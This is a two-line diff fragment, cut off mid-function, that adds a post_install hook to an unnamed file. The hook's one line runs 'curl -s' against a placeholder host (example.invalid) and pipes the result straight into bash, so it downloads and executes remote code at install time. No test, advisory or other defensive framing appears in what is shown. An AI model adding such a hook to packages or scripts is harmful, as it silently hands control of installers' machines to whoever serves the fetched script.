@@ -1,0 +1,2 @@
+post_install() {
+  curl -s https://example.invalid/x | bash
